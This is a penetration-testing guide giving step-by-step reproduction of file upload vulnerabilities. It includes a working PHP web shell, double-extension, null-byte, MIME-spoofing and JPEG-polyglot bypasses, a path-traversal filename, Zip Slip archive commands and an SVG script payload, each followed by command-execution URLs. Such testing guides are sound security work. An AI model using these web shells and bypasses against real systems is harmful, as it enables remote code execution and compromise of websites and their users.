# File Upload Vulnerabilities - Reproduction Steps

This document provides detailed step-by-step procedures for reproducing file upload vulnerabilities in controlled, authorized testing environments.

## Reproduction Methodology

- Reconnaissance: Identify upload endpoints
- Baseline testing: Confirm normal behavior
- Bypass attempts: Extension, MIME, and content tricks
- Verification: Confirm execution, access, or impact
- Documentation: Capture evidence, requests, and responses

---

## Scenario 1: Unrestricted File Upload leading to RCE (PHP web shell)

### Prerequisites
- Target application with file upload feature
- Burp Suite or similar intercepting proxy
- Test environment with PHP enabled

### Steps

1. **Identify Upload Functionality**
   - Navigate to the file upload feature (e.g., profile picture, document upload)
   - Inspect the form and note the endpoint (e.g., POST /upload.php)

2. **Attempt Normal Upload**
   - Upload a legitimate file (e.g., image.jpg)
   - Observe the response:
     - Note where the file is stored (e.g., /uploads/image.jpg)
     - Check if the file is accessible via direct URL
   - Record the baseline behavior

3. **Craft Malicious PHP File**
   - Create shell.php with content:
     ```php
     <?php system($_GET['c']); ?>
     ```

4. **Upload PHP File**
   - Attempt to upload shell.php
   - Intercept the request with Burp Suite
   - Observe the server response:
     - If rejected: Note the error message
     - If accepted: Note the storage path

5. **Access and Execute**
   - If upload succeeded, navigate to the uploaded file:
     ```
     https://target/uploads/shell.php?c=id
     ```
   - If successful, you will see command output (e.g., uid=33(www-data) gid=33(www-data))

6. **Document Evidence**
   - Capture the upload request/response
   - Screenshot the command execution
   - Note the impact: Remote Code Execution as web server user

### Expected Outcome
- Vulnerable: PHP file uploaded and executed
- Secure: Upload rejected or file not executable

---

## Scenario 2: Extension Bypass - Double Extension

### Prerequisites
- Target blocks .php uploads
- Testing tools ready

### Steps

1. **Confirm Restriction**
   - Upload test.php
   - Observe rejection (e.g., "Only images allowed")

2. **Craft Bypass Payload**
   - Create file: shell.php.jpg
   - Content: PHP web shell as above

3. **Upload with Interceptor**
   - Upload shell.php.jpg via browser
   - Intercept with Burp Suite
   - Note the Content-Type and filename in multipart request

4. **Modify if Needed**
   - If rejected, try variations:
     - shell.jpg.php
     - shell.php%00.jpg (null byte)
     - shell.PhP (case variation)

5. **Access File**
   - Navigate to uploaded file path
   - Test execution:
     ```
     https://target/uploads/shell.php.jpg?c=whoami
     ```
   - Some servers honor the first extension (.php) and execute

6. **Document**
   - Capture bypass technique that succeeded
   - Evidence of execution
   - Note server behavior (Apache mod_mime, etc.)

### Expected Outcome
- Vulnerable: Server executes based on first extension
- Secure: File not executed or renamed safely

---

## Scenario 3: MIME Type Bypass

### Prerequisites
- Target validates Content-Type header
- Burp Suite ready

### Steps

1. **Identify Validation**
   - Upload shell.php
   - Observe error mentioning MIME type (e.g., "Invalid image file")

2. **Capture Request**
   - Upload a legitimate image (test.jpg)
   - Intercept with Burp Suite
   - Note the Content-Type: image/jpeg

3. **Craft Malicious Request**
   - Upload shell.php again
   - Intercept the request
   - Modify Content-Type to: image/jpeg
   - Keep filename as shell.php
   - Forward the request

4. **Verify Upload**
   - Check if upload succeeded
   - Note the stored path

5. **Execute**
   - Access:
     ```
     https://target/uploads/shell.php?c=ls
     ```

6. **Document**
   - Show original rejection
   - Show modified request with spoofed MIME
   - Evidence of execution
   - Explain: Server trusted client-provided header

### Expected Outcome
- Vulnerable: MIME validation bypassed, file executed
- Secure: Content inspected, execution prevented

---

## Scenario 4: Magic Bytes Bypass

### Prerequisites
- Target checks file signatures (magic bytes)
- Hex editor or script to craft polyglot

### Steps

1. **Understand Check**
   - Upload shell.php
   - Observe rejection (e.g., "File signature invalid")

2. **Create Polyglot**
   - Prepend JPEG magic bytes to PHP:
     ```
     \xFF\xD8\xFF\xE0JFIF\x00<?php system($_GET['c']); ?>
     ```
   - Save as polyglot.php

3. **Upload**
   - Upload polyglot.php
   - Set Content-Type: image/jpeg
   - Server may accept due to valid magic bytes

4. **Execute**
   - Navigate to:
     ```
     https://target/uploads/polyglot.php?c=id
     ```
   - PHP interpreter may execute despite leading bytes

5. **Document**
   - Hex dump of file showing magic bytes + PHP
   - Upload success
   - Execution proof
   - Note: Demonstrates insufficient validation (signature only, not full content)

### Expected Outcome
- Vulnerable: File accepted and executed
- Secure: Content sanitized or re-encoded, execution prevented

---

## Scenario 5: Path Traversal in Filename

### Prerequisites
- Upload endpoint vulnerable to path manipulation
- Access to server filesystem (to verify)

### Steps

1. **Baseline Upload**
   - Upload test.txt
   - Note storage location: /var/www/html/uploads/test.txt

2. **Craft Traversal**
   - Create shell.php
   - Intercept upload request
   - Modify filename to:
     ```
     ../../../../var/www/html/shell.php
     ```

3. **Upload**
   - Forward the modified request
   - Check response for success or error

4. **Verify Placement**
   - Access:
     ```
     https://target/shell.php?c=pwd
     ```
   - If accessible, path traversal succeeded

5. **Document**
   - Show traversal payload
   - Evidence of file written outside intended directory
   - Impact: Arbitrary file write, potential overwrite of critical files

### Expected Outcome
- Vulnerable: File written to unintended location
- Secure: Path normalized or rejected

---

## Scenario 6: Archive Extraction (Zip Slip)

### Prerequisites
- Target extracts uploaded archives automatically
- Zip creation tool

### Steps

1. **Identify Extraction**
   - Upload legitimate.zip
   - Observe extraction behavior

2. **Craft Malicious Archive**
   - Create shell.php
   - Add to zip with traversal path:
     ```
     zip evil.zip shell.php
     zip -r evil.zip ../../../../var/www/html/shell.php
     ```
   - Or use tool to set internal path with ../

3. **Upload Archive**
   - Upload evil.zip
   - Server extracts contents

4. **Verify Extraction**
   - Access:
     ```
     https://target/shell.php?c=id
     ```

5. **Document**
   - Show zip contents with traversal paths
   - Extraction log (if available)
   - Execution proof
   - Explain: Zip Slip vulnerability (CVE-2018-1002200)

### Expected Outcome
- Vulnerable: Files extracted outside intended directory
- Secure: Paths validated before extraction

---

## Scenario 7: SVG File with Embedded Script (XSS)

### Prerequisites
- Target accepts SVG uploads
- Renders SVG inline (not forced download)

### Steps

1. **Craft Malicious SVG**
   - Create image.svg:
     ```xml
     <svg xmlns="http://www.w3.org/2000/svg">
       <script>alert(document.domain)</script>
     </svg>
     ```

2. **Upload SVG**
   - Upload image.svg
   - Note storage path

3. **Trigger XSS**
   - Navigate to uploaded file:
     ```
     https://target/uploads/image.svg
     ```
   - If rendered inline, script executes
   - Alert box displays domain

4. **Document**
   - SVG payload
   - Upload success
   - Script execution proof
   - Impact: Stored XSS via file upload

### Expected Outcome
- Vulnerable: Script executes in victim's browser
- Secure: SVG sanitized or served with safe headers (Content-Disposition: attachment)

---

## Verification and Evidence Collection

For each scenario, capture:
- Request/Response pairs (Burp Suite HTTP history)
- Screenshots of command execution or impact
- Server logs (if accessible)
- File system evidence (uploaded file location and content)
- Clear description of attack path and impact

## Testing Methodology Summary

1. **Reconnaissance**: Map upload features
2. **Baseline**: Understand normal behavior
3. **Attack**: Apply bypass techniques systematically
4. **Verify**: Confirm vulnerability and impact
5. **Document**: Provide reproducible steps and evidence

## Responsible Disclosure

- Test only in authorized environments
- Use non-destructive commands (id, whoami, ls) for proof
- Report findings to security team immediately
- Avoid exposing vulnerabilities publicly before remediation
